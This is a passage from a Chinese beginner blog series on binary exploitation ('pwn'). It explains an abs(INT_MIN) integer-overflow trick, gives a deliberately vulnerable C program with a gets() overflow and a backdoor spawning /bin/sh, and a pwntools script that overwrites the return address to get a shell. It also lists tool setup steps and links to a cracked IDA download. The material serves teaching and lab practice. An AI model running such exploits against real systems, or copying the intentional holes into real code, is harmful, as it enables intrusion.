buf[24];scanf(&quot;%d&quot;,&amp;size);read(0,buf,(abs(size))%24)</code></pre><p>乍一看之下这个例子几乎无懈可击,获取一个数字,将其的绝对值对24求余作为长度,怎么想都不会超出24的,对吧?</p><p>希望你还记得,C语言是用补码表示负数的,而通过补码求负数的绝对值怎么求?再求一次补码,即取反再加一</p><p>那么问题来了,我们都知道,int类型表示数的时候,能表示的负数事实上比正数要多一个(因为符号为1的数全部都是负数,但是符号位为0的数有一个是0,其他的才是正数),那么多出来的这个数(-2147483648)求补码会怎么样呢?</p><p>1000 0000 0000 0000 0000 0000 0000 0000<br>取反<br>0111 1111 1111 1111 1111 1111 1111 1111<br>加一<br>1000 0000 0000 0000 0000 0000 0000 0000</p><p>它又变回去了!因为数字位溢出到了符号位,所以这个数经过abs之后还等于它自己!</p><p>而再对24求余,还是一个负数,再传入read,由于read函数接受的第三个参数实际上是unsigned int,这里将发生一个隐式类型转换,一个int类型的负数将变成一个极其巨大的unsigned int正数!</p><p>所以在这里,向size输入-2147483648,能获得一个极其巨大的输入长度(至少2147483648的长度)</p><h3 id="溢出的实例"><a href="#溢出的实例" class="headerlink" title="溢出的实例"></a>溢出的实例</h3><p>这里我们使用一个简单的例子来进行一个栈溢出攻击演示(为了演示效果,我关闭了编译时的所有防御)</p><pre><code class="c">#include&lt;stdio.h&gt;void backdoor()&#123;    system(&quot;/bin/sh&quot;);&#125;void vul()&#123;    char buf[16];    gets(buf);&#125;int main()&#123;    vul();&#125;</code></pre><p>使用python的pwntools模块辅助我们进行攻击</p><pre><code class="python">from pwn import *p=process(&quot;./栈溢出简单实例&quot;) #启动程序backdoor=0x0040115b #这是后门函数的地址payload=b&quot;a&quot;*16 #先用16个字节填充整个buf的空间payload+=b&quot;a&quot;*8 #这8个字节用于覆盖掉保存的原函数的rbppayload+=p64(backdoor) #用后门函数覆盖掉函数的返回地址p.sendline(payload) #发送payloadp.interactive() #进入交互模式</code></pre><p>打一下</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012115544.png" loading="lazy"> </p><p>可以看到,我成功执行了system(“/bin/sh”),这是原本程序流程中不会启动的函数,标志着这次攻击的成功</p><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>本篇博客所有使用到的代码和程序均可在以下链接获取</p><p><a href="https://pan.baidu.com/s/10VzwZvSC9XHTQ5Cj558JRw">百度云</a>  密码: e034</p>]]></content>
      
      
      <categories>
          
          <category> 从0开始学pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0开始学pwn-0-学pwn前的准备</title>
      <link href="/2021/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-0-%E5%AD%A6pwn%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/"/>
      <url>/2021/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-0-%E5%AD%A6pwn%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是pwn"><a href="#什么是pwn" class="headerlink" title="什么是pwn?"></a>什么是pwn?</h2><p>”Pwn”是一个黑客语法的俚语词,是指攻破设备或者系统。发音类似“砰”,对黑客而言,这就是成功实施黑客攻击的声音——砰的一声,被“黑”的电脑或手机就被你操纵了</p><span id="more"></span><p>pwn，或者又可以称为二进制安全，是网络安全中偏向底层的分支方向，在大方向上和逆向方向靠近。<br>与纯粹的逆向有所不同的是，pwn并不善于破解本地软件的防御机制，而更多的将目光放在远程的服务器上，旨在通过网络上的信息交互，攻击软件和系统上存在的漏洞，以获得远程服务器的控制权限。<br>pwn的漏洞较为深入系统和底层，较为难以理解和利用，加之需要一定程度的逆向功底，使得pwn的门槛较高。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在开始学习pwn之前,你需要至少如下的基础知识</p><h3 id="完整的C语言语法基础"><a href="#完整的C语言语法基础" class="headerlink" title="完整的C语言语法基础"></a>完整的C语言语法基础</h3><p>在这一点上,可以不需要学习过于高深的算法知识,当然,要是会一些算法、数据结构或者能够熟练运用指针就更好了</p><h3 id="基础的linux使用能力"><a href="#基础的linux使用能力" class="headerlink" title="基础的linux使用能力"></a>基础的linux使用能力</h3><p>图形化界面在此不予阐述,有手就行。这里的linux使用指命令行状态下,能够运用基本的shell命令管理linux系统。不需要到可以进行shell编程的地步,但需要保证不能两眼一抹黑</p><h3 id="python语言基础"><a href="#python语言基础" class="headerlink" title="python语言基础"></a>python语言基础</h3><p>此处的python包括python2和python3,相信对于具有C语言语法基础的人学python都是有手就行,但我仍然要提醒读者注意python2和python3的诸多区别,尤其是python3中str类型与bytes类型的区分与转换</p><h3 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h3><p>x86系列汇编语言具有向下兼容特性,故而可以按如下顺序学习：8086、i386、amd64<br>推荐王爽老师的《汇编语言》<br>(笔者习惯使用Intel风格汇编语法,故而之后所有笔记中均使用Intel风格)<br>不要求可以手搓汇编程序,只要求可以看懂汇编代码<br>(注意,对于刚开始接触计算机的新生,学习汇编语言可能会极其痛苦)<br>对于这一步基础属实打不好的同学,可以在之后慢慢补,但是底线是至少要明白以下汇编指令的作用,在之后遇到不懂的汇编指令再百度</p><pre><code class="asm">movaddsubincdecleacmptestjejnejmpcallpushpopandorxor</code></pre><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><h3 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h3><p>首先,你需要一个可用的linux系统,依据广大pwn学习研究者的习惯,推荐linux的发行版ubuntu系统(以下的所有工具安装都基于ubuntu),请使用vmware软件安装该系统,当然,安装双系统或者把windows删了换成ubuntu我也没意见,唯一不推荐的是使用wsl模拟linux环境,不要问为什么<br>linux上C语言的动态链接库glibc在不同系统版本上版本也不同,具有不同特性,故而需要安装多个版本的ubuntu<br>在学习的初期,由于pwn中很大一部分题目,尤其是基础题,其所用libc版本为2.23,对应ubuntu版本为ubuntu16,所以在学习前期至少需要安装一个ubuntu16的系统</p><p>当然,学习到了中后期.就会知道有不更换版本而切换直接环境的办法</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>由于其它工具的需要,在不同版本ubuntu上使用的python版本不同。ubuntu16为python2,其余为python3<br>对于每一个ubuntu系统,其在安装时就内置了python2,但是python3需要额外安装,使用如下命令安装python3</p><pre><code class="shell">sudo apt install python3</code></pre><p>确认python安装完毕,版本正确后,安装python的pip模块</p><p>python2 由于已经失去官方支持,从apt只能获取到相当老版本的pip,需要另行安装(假如你尝试更新python2的pip,那么你的pip将直接崩溃,因为最新的pip压根就不支持python2)</p><p>python2安装pip</p><pre><code class="shell">sudo apt install wgetwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2 ./get-pip.py</code></pre><p>python3安装pip</p><pre><code class="shell">sudo apt install python3-pip</code></pre><p>下面的工具也会有一些使用到了pip安装,假如你觉得pip访问的速度太慢了,可以pip命令后面添加-i的参数表示临时更换国内源,其基本格式如下</p><pre><code class="shell">sudo pip install xxxx -i http://mirrors.aliyun.com/pypi/simple/</code></pre><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>你需要git工具来克隆代码托管网站上别人写好的项目</p><pre><code class="shell">sudo apt install git</code></pre><h3 id="gdb及其插件-pwndbg、peda、gef三选一"><a href="#gdb及其插件-pwndbg、peda、gef三选一" class="headerlink" title="gdb及其插件(pwndbg、peda、gef三选一)"></a>gdb及其插件(pwndbg、peda、gef三选一)</h3><p>首先,使用如下命令检查是否安装了gdb</p><pre><code class="shell">gdb -v</code></pre><p>如果没有安装,使用如下命令安装</p><pre><code class="shell">sudo apt install gdb</code></pre><p>我们不得不承认,原生gdb某种意义上真的是个傻X软件,所以我们需要一些插件来增强其功能,笔者建议pwndbg、peda、gef三选一,由于笔者习惯使用pwndbg,在这里给出pwndbg的安装方式,如需安装另外两个插件请自行百度<br>首先,克隆源代码</p><pre><code class="shell">git clone https://github.com/pwndbg/pwndbgcd pwndbg</code></pre><p>然后,使用编辑器打开setup.sh</p><pre><code class="shell">gedit ./setup.sh</code></pre><p>如果你是使用的python2,搜索并注释掉如下一行(防止pip更新炸了你的python2)</p><pre><code class="shell">$&#123;PYTHON&#125; -m pip install $&#123;INSTALLFLAGS&#125; --upgrade pip</code></pre><p>然后安装</p><pre><code class="shell">./setup.sh</code></pre><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>对于ubuntu18及以上的系统,使用基于python3的pwntools,使用如下命令安装pwntools,由于我个人认为,4.6.0版本以上的pwntools存在诸多不便(包括不便于脚本编写,不便于调试等等),故而我本人一直使用pwntools4.5</p><pre><code class="shell">sudo pip3 install pwntools==4.5</code></pre><p>对于ubuntu16,使用基于python2的pwntools。由于python2已经不再受官方支持,安装比较麻烦,需要对依赖包的版本微调。<br>以下给出安装pwntools4.0.0的命令</p><pre><code class="shell">sudo pip install setuptools==44.0sudo pip install MarkupSafe==0.9.2sudo pip install cryptography==2.5sudo pip install configparser==3.5sudo pip install zipp==0.5sudo pip install importlib-metadata==0.12sudo pip install importlib-resources==1.0sudo pip install pwntools==4</code></pre><p>在某些版本的pwntools安装完毕后,可能存在无法使用checksec命令的情况,在python中导入pwn模块后使用语句ELF(“filepath”)可以获得相同的效果</p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>ROPgadget是pwntools的依赖组件之一,当你安装完毕pwntools,也就安装好了ROPgadget<br>使用如下命令确认ROPgadget版本信息</p><pre><code class="shell">ROPgadget -v</code></pre><h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>截止本文编写,网络上大多数使用LibcSearcher的脚本使用的LibcSearcher是lieanu大佬编写的原版<br>而笔者使用的是wjhwjhn大佬根据原版修改的改进版,有关这两者的区别请查阅其github页面：<a href="https://github.com/wjhwjhn/LibcSearcher">LibcSearcherEX</a></p><pre><code class="shell">git clone https://github.com/wjhwjhn/LibcSearcher.gitcd LibcSearcherpython2 setup.py develop  #python2python3 setup.py develop  #python3</code></pre><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>使用以下命令安装one_gadget</p><pre><code class="shell">sudo apt install rubysudo gem install one_gadget</code></pre><p>截至目前,笔者仅在ubuntu20上成功安装该工具,其它版本均因无法安装ruby&gt;=2.7.0失败。</p><h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>使用以下命令安装seccomp-tools</p><pre><code class="shell">sudo apt install rubysudo gem install seccomp-tools</code></pre><p>这个工具的状态和上一个一样</p><h3 id="反编译工具"><a href="#反编译工具" class="headerlink" title="反编译工具"></a>反编译工具</h3><p>pwn手怎么能没有反编译工具呢?</p><p>ida几乎是所有逆向人员的基石工具,在我看来,无论是ghidra还是radare2,距离ida都还有不小的差距<br>当然,由于ida破解版基本只有windows的,使用上存在一些不便:pwn的东西大多半是linux的,用虚拟机得拖来拖去,或者直接在linux上用需要wine,这样的话就调用不了ida的python相关功能,包括插件,可谓及其难受<br><a href="https://pan.baidu.com/s/1RQSkUZLqfqWbFYl1fLpvLA">ida百度云</a>  密码: nfoj 解压密码:zltt_yydfw</p><p>最近又新出了个cutter,目前看来也不错,对glibc heap也有基础支持,更重要的是,全平台(TvT),有官方中文(TvT)<br><a href="https://github.com/rizinorg/cutter">Cutter github</a></p><p>以上反编译工具任选一个安装即可</p>]]></content>
      
      
      <categories>
          
          <category> 从0开始学pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome To My Blog</title>
      <link href="/2021/10/29/welcome/"/>
      <url>/2021/10/29/welcome/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>欢迎各位大佬来到我的博客,玩得开心!!!</p><blockquote><p><strong><center><font size=16>hack for fun!!!</font></center></strong></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
